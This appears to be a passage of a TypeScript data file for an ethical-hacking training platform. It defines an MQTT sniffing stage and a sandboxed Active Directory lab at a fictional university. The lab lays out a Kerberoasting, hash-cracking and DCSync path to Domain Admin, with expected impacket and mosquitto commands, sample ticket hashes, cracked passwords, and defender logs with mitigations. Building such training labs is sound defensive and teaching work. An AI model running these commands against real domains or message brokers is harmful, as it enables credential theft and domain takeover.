    attackChain: [
      {
        stage: '1. MQTT Wildcard Topic Sniffing',
        mitreTactic: 'Collection',
        mitreId: 'T1005',
        description: 'Subscribe to all MQTT topics to harvest live fleet sensor streams.',
        expectedCommand: 'mosquitto_sub -h 10.90.10.15 -t "#" -v',
        expectedOutput: `fleet/truck_04/gps {"lat": 41.8781, "lon": -87.6298, "speed_mph": 62}\nfleet/truck_04/reefer_temp {"temp_celsius": -18.2, "status": "LOCKED"}\nFLAG{BLACKSTONE_MQTT_TELEMETRY_EXCEPT}`,
        flagOrEvidence: 'FLAG{BLACKSTONE_MQTT_TELEMETRY_INTERCEPTED}'
      }
    ],
    defenderLogs: []
  },

  // 7. NEXUS UNIVERSITY (ACTIVE DIRECTORY DOMAIN)
  {
    id: 'org-nexus-university',
    name: 'Nexus University',
    codename: 'NEXUS-AD-LAB',
    logoEmoji: '🎓',
    industry: 'Higher Education & Active Directory Enterprise',
    difficulty: 'Advanced',
    xpReward: 2100,
    estimatedHours: 4.5,
    description: 'Nexus University operates a multi-tier Active Directory domain (nexus.edu.local) spanning 10,000 student and faculty accounts.',
    missionBriefing: [
      'Nexus University IT security leadership has authorized an internal Active Directory domain privilege assessment.',
      'You are provided standard student domain credentials (user: student.intern / Pass: Winter2026!).',
      'Enumerate SPNs, perform Kerberoasting on svc_mssql, audit Group Policy permissions, and identify the attack path to Domain Admin.'
    ],
    rulesOfEngagement: [
      'Scope is confined to nexus.edu.local and 172.28.0.0/24.',
      'Do not lock out the Administrator or Chancellor accounts.'
    ],
    threatModel: 'Insider student or compromised faculty workstation escalating privileges to Domain Controller to alter grading databases.',
    hypothesisPrompt: 'What steps are required to perform a Kerberoasting attack once you have low-privilege domain user credentials?',
    scope: {
      authorizedSubnet: '172.28.0.0/24',
      authorizedDomains: ['dc01.nexus.edu.local', 'fs01.nexus.edu.local', 'nexus.edu.local'],
      authorizedAssets: [
        {
          id: 'asset-nexus-dc',
          name: 'DC01.NEXUS.EDU.LOCAL',
          ip: '172.28.0.5',
          role: 'Primary Domain Controller, Kerberos KDC & DNS',
          os: 'Windows Server 2022 Datacenter',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 53, name: 'dns', state: 'open' },
            { port: 88, name: 'kerberos', state: 'open' },
            { port: 135, name: 'msrpc', state: 'open' },
            { port: 389, name: 'ldap', state: 'open' },
            { port: 445, name: 'microsoft-ds', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Service account svc_mssql has SPN MSSQLSvc/fs01.nexus.edu.local:1433 and weak RC4 Kerberos ticket.'
        },
        {
          id: 'asset-nexus-fs',
          name: 'FS01.NEXUS.EDU.LOCAL',
          ip: '172.28.0.10',
          role: 'Department File Server & MSSQL Database',
          os: 'Windows Server 2019 Standard',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 445, name: 'microsoft-ds', state: 'open' },
            { port: 1433, name: 'ms-sql-s', state: 'open' }
          ]
        }
      ],
      prohibitedTargets: ['Real university student registrar records']
    },
    activeDirectory: {
      domainName: 'nexus.edu.local',
      netbiosName: 'NEXUS',
      domainController: 'DC01.nexus.edu.local',
      domainControllerIp: '172.28.0.5',
      functionalLevel: 'Windows Server 2016',
      users: [
        {
          username: 'student.intern',
          displayName: 'Student Intern',
          title: 'IT Lab Assistant',
          department: 'Computer Science',
          groups: ['Domain Users', 'Lab-Assistants'],
          description: 'Provided low-privilege starting credentials'
        },
        {
          username: 'svc_mssql',
          displayName: 'Service - MSSQL Database',
          title: 'Database Engine Service Account',
          department: 'Enterprise Applications',
          groups: ['Domain Users', 'Tier1-Admins'],
          spn: 'MSSQLSvc/fs01.nexus.edu.local:1433',
          passwordHash: '$krb5tgs$23$*svc_mssql*nexus.edu.local*... (Hashcat mode 13100: DatabasePassword2026!)',
          description: 'Kerberoastable service principal name registered'
        },
        {
          username: 'helpdesk_jenny',
          displayName: 'Jenny Adams',
          title: 'Senior Helpdesk Specialist',
          department: 'IT Support',
          groups: ['Domain Users', 'HelpDesk-Tier1'],
          dontRequirePreauth: true,
          description: 'AS-REP Roasting vulnerable (Pre-authentication disabled)'
        },
        {
          username: 'Administrator',
          displayName: 'Builtin Domain Administrator',
          title: 'Enterprise Architecture Lead',
          department: 'Tier 0',
          groups: ['Domain Users', 'Domain Admins', 'Enterprise Admins'],
          adminCount: 1,
          description: 'Full Domain Controller administrative privileges'
        }
      ],
      groups: [
        { name: 'Domain Users', members: ['student.intern', 'svc_mssql', 'helpdesk_jenny', 'Administrator'], description: 'Default domain membership' },
        { name: 'HelpDesk-Tier1', members: ['helpdesk_jenny'], isPrivileged: true, description: 'Delegated password reset over student accounts' },
        { name: 'Tier1-Admins', members: ['svc_mssql'], isPrivileged: true, description: 'Local Admin rights on FS01 and database servers' },
        { name: 'Domain Admins', members: ['Administrator'], isPrivileged: true, description: 'Tier 0 Enterprise Domain Administrators' }
      ],
      computers: [
        { hostname: 'DC01.nexus.edu.local', ip: '172.28.0.5', os: 'Windows Server 2022', role: 'Domain Controller', shares: ['SYSVOL', 'NETLOGON', 'ADMIN$'] },
        { hostname: 'FS01.nexus.edu.local', ip: '172.28.0.10', os: 'Windows Server 2019', role: 'File & SQL Server', shares: ['DepartmentShares', 'Backups', 'C$'] }
      ],
      attackPaths: [
        {
          step: 1,
          source: 'student.intern (Domain User)',
          action: 'LDAP SPN Query (GetUserSPNs.py)',
          target: 'svc_mssql',
          technique: 'Kerberoasting',
          mitreId: 'T1558.003',
          evidenceText: 'Extracted Kerberos TGS ticket for MSSQLSvc/fs01.nexus.edu.local:1433'
        },
        {
          step: 2,
          source: 'svc_mssql (Tier1-Admins)',
          action: 'Offline Hashcat Cracking -> Password Recovered',
          target: 'FS01 Local Admin',
          technique: 'Password Cracking',
          mitreId: 'T1110.002',
          evidenceText: 'Cracked hash: DatabasePassword2026!'
        },
        {
          step: 3,
          source: 'FS01 Local Admin',
          action: 'DCSync / Secretsdump against DC01',
          target: 'Domain Admins (Administrator)',
          technique: 'DCSync Replication',
          mitreId: 'T1003.006',
          evidenceText: 'Retrieved NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:58a47812e9b049d970c8d1d897...'
        }
      ]
    },
    attackChain: [
      {
        stage: '1. Kerberoasting SPN Discovery',
        mitreTactic: 'Credential Access',
        mitreId: 'T1558.003',
        description: 'Query Active Directory LDAP to discover SPNs and request Kerberos TGS ticket.',
        expectedCommand: 'impacket-GetUserSPNs nexus.edu.local/student.intern:Winter2026! -dc-ip 172.28.0.5 -request',
        expectedOutput: `ServicePrincipalName              Name       MemberOf\nMSSQLSvc/fs01.nexus.edu.local:1433 svc_mssql  CN=Tier1-Admins,CN=Users,DC=nexus,DC=edu,DC=local\n\n$krb5tgs$23$*svc_mssql*nexus.edu.local*MSSQLSvc/fs01.nexus.edu.local:1433*$4b8e...[TICKET HASH]`,
        flagOrEvidence: 'FLAG{NEXUS_KERBEROAST_TICKET_CAPTURED}'
      }
    ],
    defenderLogs: [
      {
        timestamp: '16:30:12 UTC',
        source: 'Windows EventLog',
        severity: 'CRITICAL',
        message: 'Event ID 4769: A Kerberos service ticket was requested. Target: svc_mssql Ticket Options: 0x40810000 Ticket Encryption Type: 0x17 (RC4-HMAC weak encryption)',
        correlatedAttackerAction: 'impacket-GetUserSPNs ... -request',
        recommendedMitigation: 'Enforce AES-256 Kerberos encryption types and migrate service accounts to Group Managed Service Accounts (gMSA).'
      }
    ]
  }
];

export function getEthicalHackerOrgById(id: string): EthicalHackerOrganization {
  return ETHICAL_HACKER_ORGANIZATIONS.find(o => o.id === id) || ETHICAL_HACKER_ORGANIZATIONS[0];
}
